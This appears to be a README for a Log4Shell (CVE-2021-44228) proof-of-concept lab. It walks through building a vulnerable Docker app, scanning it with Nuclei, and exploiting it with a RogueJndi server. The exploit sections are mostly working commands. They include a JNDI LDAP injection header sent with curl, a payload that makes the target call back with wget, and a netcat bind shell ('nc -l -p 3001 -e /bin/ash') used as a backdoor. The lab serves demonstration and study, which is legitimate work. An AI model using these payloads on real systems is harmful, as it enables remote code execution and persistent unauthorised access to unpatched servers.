# Log4Shell POC

Demonstrates the Log4Shell (CVE-2021-44228) vulnerability.
You can run a simple attack to demonstrate JNDI out of band (OOB) attack. But also more sophisticated attacks with your own code e.g. to open a backdoor using netcat (nc).

This repo consists for three parts:

1. Vulnerable App (Vulnerable-App)
2. JNDI Server (RogueJndi)
3. Vulnerability Scanner (Nuclei)

All three repos have their origin in separate upstream projects (see following sections for more details)

# Requirements

1. Docker
2. Java
3. Maven

## Install maven

### MacOS

```bash
brew install maven
```

# Setup

## clone the repos

```bash
git clone git@github.com:druminik/log4shell-poc.git
git clone git@github.com:druminik/log4shell-vulnerable-app.git
git clone git@github.com:druminik/nuclei.git
git clone git@github.com:druminik/nuclei-templates.git
git clone git@github.com:druminik/rogue-jndi.git

```

## Run the vulnerable app

```bash
docker build -f log4shell-vulnerable-app/Dockerfile -t vulnerable-app log4shell-vulnerable-app/.
docker run -p 8080:8080 -p 3001:3001 --name vulnerable-app --rm vulnerable-app
```

## Get your local ip address (MacOS)

```bash
# for ethernet
ipconfig getifaddr en0
# for wireless
ipconfig getifaddr en1

```

## Test app for vulnerability

Build the docker container

```bash
docker build -f nuclei/Dockerfile -t nuclei nuclei/.
```

Now let's test if the server will tell us its hostname. Replace "your-private-ip" with the ip of your vulnerable app docker container

```bash
docker run -it --rm --entrypoint bin/ash nuclei
nuclei -duc -t /root/nuclei-templates/cves/2021/CVE-2021-44228.yaml -u http://your-private-ip:8080
```

If the remote server is vulnerable to the log4shell bug, it will give you an output like following. The last element in the output (8dc4a6fbe91b) is the remote server's hostname.

Example

```bash
$> nuclei -duc -t /root/nuclei-templates/cves/2021/CVE-2021-44228.yaml -u http://192.168.1.126:8080
                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   2.6.0

                projectdiscovery.io

[WRN] Use with caution. You are responsible for your actions.
[WRN] Developers assume no liability and are not responsible for any misuse or damage.
[INF] Using Nuclei Engine 2.6.0 (latest)
[INF] Using Nuclei Templates 8.8.4 (latest)
[INF] Templates added in last update: 3030
[INF] Templates loaded for scan: 1
[INF] Using Interactsh Server: oast.live
[2022-02-06 19:12:58] [CVE-2021-44228] [http] [critical] http://192.168.1.126:8080/ [62.2.17.166,8dc4a6fbe91b.xapiversion.c801rcpc7q5s72ri0tr0ceyb5pyyyyyyr.oast.live,xapiversion,8dc4a6fbe91b]
```

# Exploit the server

Now let's run some command on the remote server.

The JNDI Server (RogueJNDI) will run a JNDI server (port 1389) and a http server (8000). The JNDI Server will serve exploit code to be executed on the vulnerable-app. The http server is a backcall server for receiving calls sent from the vulnerable app.

## Run the JNDI server

Start a new console and run the following commands. This will start two servers listening on separate ports.

1. LDAP Server, port 1389
2. Web Server, port 8000
   The web server will serve the code to execute. The LDAP server will tell the vulnerable app where to load the code to execute.

```bash
cd rogue-jndi
mvn compile package
java -jar target/RogueJndi-1.1.jar -c "wget http://your-private-ip:8000/callback/gugus"
```

Example

```bash
java -jar target/RogueJndi-1.1.jar -c "wget http://192.168.1.126:8000/callback/gugus"
```

## Run simple attack

Call the vulnerable app (on 127.0.0.1:8080) to load remote code from your jndi server (jndi:ldap://your-private-ip:1389). The code is referenced by the path (/o=reference).
Replace the code to be executed as you wish. You'll find it in the following file:
rogue-jndi/src/main/java/artsploit/ExportObject.java

Run the following command in a new console

```bash
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/o=reference}'
```

Example

```bash
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.1.126:1389/o=reference}'
```

## open backdoor on server running vulnerable app

Let's start a backdor using netcat (nc) on the vulnerable app server.

Restart the jndi server with the following command.

```bash
java -jar target/RogueJndi-1.1.jar -c "nc -vv -l -p 3001 -e /bin/ash"
```

Start the remote nc server on the vulnerable app.
Run the following command in a new console

```bash
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/o=reference}'
```

In a new console login with nc

```bash
nc -v localhost 3001
```

Test the backdoor by executing some linux shell commands and have fun

```
ls
uname -r
ls /app
```

# References

## Vulnerable app

https://github.com/christophetd/log4shell-vulnerable-app

## RogueJNDI

https://github.com/veracode-research/rogue-jndi.git

## Nuclei

https://github.com/projectdiscovery/nuclei
